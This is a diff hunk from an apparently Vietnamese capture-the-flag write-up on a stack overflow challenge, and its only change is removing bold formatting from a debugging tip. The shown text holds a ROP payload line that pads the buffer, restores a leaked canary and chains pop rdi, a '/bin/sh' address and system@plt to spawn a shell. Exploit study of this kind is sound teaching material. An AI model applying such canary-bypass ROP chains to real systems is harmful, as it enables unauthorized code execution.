@@ -96,7 +96,7 @@ GOT protection: Partial RELRO | Found 6 GOT entries passing the filter
 - Lần input thứ 2: Overwrite ret để đẩy /bin/sh vào rdi rồi ret call system để lấy được shell.
 > Payload = b'A'*56 + p64(canary) + p(0) */Saved rbp/* + p64(pop_rdi) + p64(0x0000000000400874) + p64(ret) + p64(exe.plt['system'])
 ```
-* Lưu ý: Khi chạy tới call system hãy **quit** luôn để lấy shell, đừng chạy vào do_system sẽ bị SIGSEGV vì dữ liệu lúc call này đã bị thay đổi do không đúng vị trí. 
+* Lưu ý: Khi chạy tới call system hãy quit luôn để lấy shell, đừng chạy vào do_system sẽ bị SIGSEGV vì dữ liệu lúc call này đã bị thay đổi do không đúng vị trí. 
 ```
 
 ## Script
